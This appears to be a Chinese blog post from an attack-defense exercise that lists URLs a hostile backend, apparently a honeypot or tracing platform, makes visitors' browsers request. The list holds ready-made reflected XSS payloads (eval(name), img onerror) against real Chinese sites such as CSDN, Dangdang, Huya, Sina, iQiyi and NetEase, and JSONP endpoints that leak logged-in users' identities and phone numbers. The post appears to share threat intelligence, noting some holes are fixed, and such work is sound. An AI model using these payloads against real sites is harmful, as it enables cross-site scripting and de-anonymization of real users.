\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/Dz75jFkiUh4Wt1SuhV91kQ)

话说，攻防演练，看到某个后台，进去以后，疯狂的访问某些接口。  

**后台长这样：**  

![](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZL6gJ5SGlXsAljoNrNiapybMOukiapkMGQHjr3rmyicuFHdETAnib1pkKezKW6m7oSibWbnGsG2FAZ0lwQ/640?wx_fmt=png)

然后，接口如下：  

```
https://ajax.58pic.com/58pic/index.php?m=adManageSystem&a=showAdDeliveryForPosition&callback=%3Cscript%3Eeval(name)%3C/script%3E&position=31&keyword=XXX&\_=1590829943379
https://api.csdn.net/oauth/authorize?client\_id=1000001&redirect\_uri=http://www.iteye.com/auth/csdn/callback&response\_type=%22https%3A%2F%2Fapi.csdn.net%2Foauth%2Fauthorize%3Fclient\_id%3D1000001%26redirect\_uri%3Dhttp%3A%2F%2Fwww.iteye.com%2Fauth%2Fcsdn%2Fcallback%26response\_type%3D%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E
http://databack.dangdang.com/dde.php?platform=pc&type=3&url=http%253A%252F%252Fwww.dangdang.com%252F&charset=GBK&perm\_id=20200530121832924211210288241440628&page\_id=mix\_317715&website=dangdang.com&expose=%255B%2522mix\_317715.3208542%252C9339%252C9354..%2522%252C%2522mix\_317715.3208542%252C9339%252C9356..%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9341..%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.1.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.2.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.3.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.4.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.5.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.6.%2522%252C%2522mix\_317715.3208542%252C9339%252C9356%252C9342.7.%2522%255D&callback=%3Ciframe/src=javascript:eval(window.parent.name)%3E
https://hd.huya.com/web/anchor\_recruit/index.html?id=42566%26callback=eval(name)%23&anchorsrc=0
https://iask.sina.com.cn/cas/logins?domain=iask.sina.com.cn&businessSys=iask&channel=null&popup=show&clsId=undefined&fid=%22%3E%3Cscript%3Eeval(name)%3C/script%3E
https://www.iqiyi.com/intl/invite.html?lang=zh\_cn&mod=&uid=34001220748&sh\_pltf=%22%3E%3Cimg%20src%3Dx%20onerror%3Deval(window.name)%3E%3C!--
https://yys.cbg.163.com/cgi/mweb/search/r/role?keyword=xxxx&callback=eval(name);%2F%2F
https://c.v.qq.com/vuserinfo?otype=json&callback=jsonp\_callback\_7qmpb7gI
https://wap.sogou.com/passport?op=get\_userinfo&\_=1545658098069&callback=jsonp\_callback\_Ndd7gI2o
https://v2.sohu.com/user/info/web?&callback=jsonp\_callback\_ESlgJFOU
http://passport.game.renren.com/user/info?callback=jsonp\_callback\_3SvhHiZS
http://passport.tianya.cn/online/checkuseronline.jsp?t=1584614187028&callback=callback
https://analyze.pwnchain.cn/s/jquery.min.js?v=1604891764518
https://api.m.jd.com/client.action?functionId=getBabelProductPaged&body=%7b%22%73%65%63%6f%6e%64%54%61%62%49%64%22%3a%22%30%30%31%35%35%35%35%34%37%30%38%39%33%5f%30%33%37%32%36%36%30%30%5f%22%2c%22%74%79%70%65%22%3a%22%30%22%2c%22%70%61%67%65%4e%75%6d%22%3a%22%31%22%2c%22%6d%69%74%65%6d%41%64%64%72%49%64%22%3a%22%22%2c%22%67%65%6f%22%3a%7b%22%6c%6e%67%22%3a%22%22%2c%22%6c%61%74%22%3a%22%22%7d%2c%22%61%64%64%72%65%73%73%49%64%22%3a%22%22%2c%22%70%6f%73%4c%6e%67%22%3a%22%22%2c%22%70%6f%73%4c%61%74%22%3a%22%22%2c%22%66%6f%63%75%73%22%3a%22%22%2c%22%69%6e%6e%65%72%41%6e%63%68%6f%72%22%3a%22%22%7d&screen=2799\*1208&client=wh5&clientVersion=1.0.0&sid=&uuid=&area=&\_=1585823068850&callback=jsonp1
https://api.csdn.net/oauth/x
https://www.zbj.com/g/service/api/getUserPhone?&callback=jsonp\_callback\_eAkznysF
https://bbs.zhibo8.cc/user/userinfo?device=pc&\_=1584613345023&callback=jsonp\_callback\_dApN65sU
https://l.huya.com/udb\_web/udbport2.php?m=HuyaLogin&do=checkLogin&callback=jQuery22407402084422104858\_1604891765254&\_=1604891765255
https://www.huya.com/cacheapp.php?m=UpcomingApi&do=getUpcomingDetailById&id=42566&callback=eval(name)
https://yys.cbg.163.com/cgi/show\_login?back\_url=%2Fcgi%2Fmweb%2Fsearch%2Fr%2Frole%3Fkeyword%3Dxxxx%26callback%3Deval%2528name%2529%253B%252F%252F
https://t.captcha.qq.com/template/captcha-pre-verify.html
https://stc.iqiyipic.com/js/qiyiV2/notFoundEntryIndex\_ver.js?1oqi4nl
https://captcha.gtimg.com/public/2/captcha-token-detect.html
https://static.iqiyi.com/js/sdkpack/sdkpackmanager.js?v=0.5962165569518767
https://pcw-api.iqiyi.com/resource/resource/online/13384501312?callback=jQuery09802066480284193\_1604891766673&\_=1604891766673
https://other-tracer.cbg.163.com/1.gif?log=page\_load&status=1&time=1350&info=1536x864&product=yys&client\_type=h5&useragent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F86.0.4240.183%20Safari%2F537.36&from=https%3A%2F%2Fyys.cbg.163.com%2Fcgi%2Fmweb%2Fsearch%2Fr%2Frole%3Fkeyword%3Dxxxx%26callback%3Deval(name)%3B%252F%252F&fingerprint=&urs=
https://dl.reg.163.com/webzj/v1.0.1/pub/index2\_new.html?cd=https%3A%2F%2Fcbg-yys.res.netease.com%2Frc3fe8fa6b23ba7e6c786b&cf=%2Fcss%2Furs-login-with-phone.css&MGID=1604891767595.462&wdaId=&pkid=aqpOBwV&product=cbg
https://other-tracer.cbg.163.com/1.gif?filename=https%3A%2F%2Fpr.nss.netease.com%2Fsentry%2Fpassive%3FclusterName%3Durs-webzj-static-passive%26modelName%3Dwebzj\_response\_time2%26one%3D1%26pd%3Dcbg%26pkid%3DaqpOBwV%26uapi%3DrenderOk%26dataTime%3D1604891769063%26domain%3Ddl.reg.163.com%26step1%3D0%26step2%3D0%26step3%3D1%26step4%3D0%26step5%3D0%26step6%3D0%26step7%3D0%26step8%3D0%26step9%3D0%26step10%3D0&msg=LOAD\_FAILED&idx=1&pagestatus=load&loadtime=681&duration=2674&product=yys&log=js\_error&client\_type=h5&useragent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F86.0.4240.183%20Safari%2F537.36&from=https%3A%2F%2Fyys.cbg.163.com%2Fcgi%2Fmweb%2Fsearch%2Fr%2Frole%3Fkeyword%3Dxxxx%26callback%3Deval(name)%3B%252F%252F&fingerprint=&urs=
https://pcw-api.iqiyi.com/resource/resource/online/31291356312?callback=window.Q.\_\_callbacks\_\_.cbdxtwpn
https://pcw-api.iqiyi.com/resource/resource/multionline/1326049912,208039112?callback=qiyiheaderSdkJsonpCallback1
https://api.ip.sb/jsonip?callback=jsonp\_callback\_kOXSMRh9
```

部分已经修复，各位加油。